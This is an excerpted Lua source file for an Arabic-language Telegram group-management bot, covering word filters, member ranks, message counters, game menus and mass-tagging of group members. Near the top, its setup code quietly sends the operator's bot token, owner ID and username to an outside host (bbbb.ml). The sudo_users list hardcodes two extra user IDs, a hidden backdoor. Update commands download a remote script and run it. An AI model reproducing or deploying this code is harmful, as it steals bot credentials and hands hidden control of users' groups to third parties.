...
https.request('http://bbbb.ml/google/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("google", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/google
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./google.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("GA", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S google -X kill
screen -S google ./google
done
]])  
file:close() 
...
sudo_users = {SUDO,1520530041,1463960994}   
...
if tonumber(user_id) == tonumber(1520530041) then  
var = true  
...
local google_Msg = ''  
if msgs < 100 then 
google_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
google_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
google_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
google_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
google_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
google_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
google_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
google_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
google_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
google_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
google_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
google_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
google_Msg = 'رب التفاعل '  
end 
return google_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcegoogle(msg,data) -- بداية العمل
if msg then
...
Sourcegoogler = ' ゠ههلو عمري 💞⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, Sourcegoogler) 
end
end
...
send(msg.chat_id_, msg.id_,google_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf google.lua')
os.execute('wget https://raw.githubusercontent.com/googleTEEM/google/master/google.lua')
...
local google = (w + q)
local sendok = #group - google
if q == 0 then
google = ''
else
google = '\n܁♪•┆ تم ازالة ['..q..'](https://t.me/KGTBM) مجموعات من البوت 🎸ܰ'
end
if w == 0 then
googlek = ''
else
googlek = '\n܁♪•┆ تم ازالة ['..w..'](https://t.me/KGTBM) مجموعات من البوت 🎸ܰ'
end
...
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'Soooooooooooooooood')..')'
...
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Soooooooooooooooood')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
...
local google1_Msg = database:get(bot_id.."google1:Add:Filter:Rp2"..text..msg.chat_id_)   
if google1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Soooooooooooooooood')..') \n 📬┇'..google1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if google_Msg and not Special(msg) then  
local google_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if google_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..google_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/Soooooooooooooooood)}\n🚫┇["..google_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "܁♪•┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/Soooooooooooooooood)  🎸ܰ\n܁♪•┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  🎸ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,'܁♪•┆ تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  ◃ ['..Num..'](https://t.me/KGTBM) عضو 🎸ܰ')
end
...
os.execute('rm -rf google.lua')
os.execute('wget https://raw.githubusercontent.com/bkarm39/Soooooooooooooooood/master/google.lua')
send(msg.chat_id_, msg.id_,'✥┆ تم تحديث السورس . 𖦲 ◜')
dofile('google.lua')  
end
...
if text == 'ابغا بوت' or text == 'مطور هاديه' or text == 'ابغا' then
Text = [[

🧚 - [Soooooooooooooooood](t.me/Soooooooooooooooood) 💘
...
if text == 'سورس' then
local Text =[[
𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒐𝒖𝒓𝒄𝒆 𝒉𝒂𝒅𝒚 𓁻
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝐠𝐨𝐨𝐠𝐥𝐞 ☽‘', callback_data="https://t.me/KGTBR"},
},
{
{text = 'ℐᎯℳℳᎯℳ ☽‘', callback_data="https://t.me/A_4_P"},
},
{
{text = '𝒉𝒂𝒅𝒚 𓁻', callback_data="https://t.me/Soooooooooooooooood"},
},
}
...
if text == 'العاب هاديه ' then
local Text =[[
𝒉𝒂𝒅𝒊𝒚𝒂 𝒈𝒂𝒎𝒆𝒔 𝒂𝒓𝒆 𝒕𝒉𝒆 𝒃𝒆𝒔𝒕 𝒔𝒐𝒖𝒓𝒄𝒆 𝒊𝒏 𝒕𝒉𝒆 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𓁻
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'لعبة فلابي بيرد 🐥 ☽‘', callback_data="https://t.me/awesomebot?game=FlappyBird"},
},
{
{text = 'تحداني فالرياضيات 🔢‘', callback_data="https://t.me/gamebot?game=MathBattle"},
},
{
{text = 'سباق الدراجات 🏍 ☽‘', callback_data="https://t.me/gamee?game=MotoFX"},
},
{
{text = 'سباق سيارات 🏎‘', callback_data="https://t.me/gamee?game=F1Racer"},
},
{
{text = 'متشابه 👾‘', callback_data="https://t.me/gamee?game=DiamondRows"},
},
{
{text = 'كرة قدم ⚽ ☽‘', callback_data="https://t.me/gamee?game=FootballStar"},
},
{
{text = 'دومنا🥇‘', callback_data="https://vipgames.com/play/?affiliateId=wpDom/#/games/domino/lobby"},
},
{
{text = '❕ليدو‘', callback_data="https://vipgames.com/play/?affiliateId=wpVG#/games/ludo/lobby"},
},
{
{text = 'ورق🤹‍♂‘', callback_data="https://t.me/gamee?game=Hexonix"},
},
{
{text = '𝒉𝒂𝒅𝒚 𓁻', callback_data="https://t.me/Soooooooooooooooood"},
},
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Soooooooooooooooood')..') \n☑️┇ تـم قفـل السيلفي بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "Soooooooooooooooood")
...
-------------------------------------google - @KGTBR - @KGTBR - @KGTBM - @KGTBK ---------------------------------------
...
send(msg.chat_id_, msg.id_,'܁♪•┆تم وضع عدد االتكرار ◃ ◞ [('..Num..')](https://t.me/KGTBM) ◟ 🎸ܰ')  
end 
...
database:set(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁♪•┆ارسل التحذير عند ارسال الكلمة 🎸ܰ")  
database:set(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."google1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."google1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁♪•┆تم منع الكلمه مع التحذير 🎸ܰ")  
database:del(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."google1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."google1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."google1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁♪•┆ارسل الكلمةه الان 🎸ܰ ")  
database:set(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."google1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."google1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."google1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."google1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."google1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."google1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💞◟\n√••••••••••••••••••••••••••••••••••√\n"
for k,v in pairs(list) do  
local google_Msg = database:get(bot_id.."google1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..google_Msg.."◜\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Soooooooooooooooood')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'܁♪•┆عدد رسائل الحلو ◃ ['..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'](https://t.me/KGTBM) 🎸ܰ' ) 
end 
...
send(msg.chat_id_,msg.id_,'┐ هلو عمري 🎸٭ \n┘ تم تنظيف ◞ ['..num..'](https://t.me/KGTBM) ◜ رسالة ✓ ٭')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'هاديه').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'هاديه')
local google_Msg = {
'عمغي 🥺💞🎸.',
'هلا ابو الحب 💘💘 .'
}
send(msg.chat_id_, msg.id_,'['..google_Msg[math.random(#google_Msg)]..']') 
return false
end
...
if text == "all" or text == "@all" or text == "ناديهم" or text == "صحي التيم" and is_momod(msg.sender_user_id_, msg.chat_id_) and google11(msg) then if googledx1:get(google.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return googledx(msg.chat_id_, msg.id_, 1, "✦┋انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end googledx1:setex(bot_id..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,google)  tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = google.member_count_},function(dxx,googler) x = 0 tags = 0 local list = googler.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
--      By Developer Victor      -- 
if text:match("^all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and google11(msg) then local txt = {string.match(text, "^(all) (.*)$")} if googledx1:get(google.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return googledx(msg.chat_id_, msg.id_, 1, "✦┋انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end googledx1:setex(google..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,google) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = google.member_count_},function(dxx,googler) x = 0 tags = 0 local list = googler.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
--      By Developer Victor      -- 
if text:match("^@all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and google11(msg) then local txt = {string.match(text, "^(@all) (.*)$")} if googledx1:get(google.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return googledx(msg.chat_id_, msg.id_, 1, "✦┋انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end googledx1:setex(google..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,google) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = google.member_count_},function(dxx,googler) x = 0 tags = 0 local list = googler.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
...
send(msg.chat_id_, msg.id_,"\n܁♪•┆هلو عمري 🎸ܰ\n܁♪•┆تم تنزيل [العضو](https://t.me/KGTBM) 🎸ܰ\n܁♪•┆ ܊  "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." ܊\n")
else
...
send(msg.chat_id_, msg.id_,'܁♪•┆ارسل الرد الذي تريده 🎸ܰ\n܁♪•┆سواء كان ▿\n܁♪•┆[صوره](https://t.me/KGTBM) ܊ [بصمه](https://t.me/KGTBM) ܊ [فيد](https://t.me/KGTBM) ܊ [متحركه](https://t.me/KGTBM) ܊ [ملصق](https://t.me/KGTBM) ܰ')
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'هاديه').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_, msg.id_,'܁♪•┆امر مين ضافني تم تعطيله من قبل المدراء 🎸ܰ  ') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = '܁♪•┆ههلو عمري 🎸ܰ \n܁♪•┆تم تفعيل امر مين ضافني 🎸ܰ'
...
Text = '܁♪•┆عدد جهاتك المضافة ˼ ['..Num..'](https://t.me/KGTBM) ˹'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'܁♪•┆ عدد المشتركين ◃ ['..#pv..'](https://t.me/KGTBM) ܰ\n܁♪•┆تم ازالة ◃ ['..sendok..'](https://t.me/KGTBM) " من المشتركين  \n܁♪•┆عدد المشتركين الحقيقي ◃ ['..ok..'](https://t.me/KGTBM) " مشترك\n')   
end
end
end,nil)
end,nil)
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..googlek..''..google..'\n*☑️┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
send(msg.chat_id_, msg.id_,"\n٭ 𖤓┆تم اضافة ◞ ["..numadded..'](https://t.me/KGTBM) ◜ من الرسائل 🎸٭')  
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,"┐ هلو عمري 🎸٭ \n┘ تم اضافة ◞ ["..Num..'](https://t.me/KGTBM) ◜ مجوهرات ✓ ٭')  
end
...
send(msg.chat_id_, msg.id_, "\n٭ 𖤓┆تم اضافة ◞ ["..num..'](https://t.me/KGTBM) ◜ من الرسائل 🎸٭')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
...
Text = '٭ 𖤓┆عدد مجوهراتك ◃ ◞ ['..Num..'](https://t.me/KGTBM) ◜.'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,"\n✥┆لا تستطيع البيع اقل من ◞[1](https://t.me/KGTBM)◜ ◃") 
return false 
end
...
send(msg.chat_id_,msg.id_,'┐ تم خصم ◞['..NUMPY..'](https://t.me/KGTBM)◜ من مجوهراتك ✓ ٭\n┘ تم اضافة ◞['..(NUMPY * 50)..'](https://t.me/KGTBM)◜ رسالة الى رسائلك ✓ ٭')
end 
return false 
end
...
√••••••••••••••••••••••••••••••••••√
[𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒐𝒖𝒓𝒄𝒆 𝒉𝒂𝒅𝒚 𓁻](t.me/Soooooooooooooooood) 🎸
]]
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'هاديه')
...
google = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(google)
...
--------------------------------------------------------------------------------------------------------------
Sourcegoogle(data.message_,data)
plugin_googlea(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local googleAbot = database:get(bot_id.."google1:Add:Filter:Rp2"..text..result.chat_id_)   
if googleAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..googleAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local google1_Msg = database:get(bot_id.."google1:Add:Filter:Rp2"..text..result.chat_id_)   
if google1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..google1_Msg)
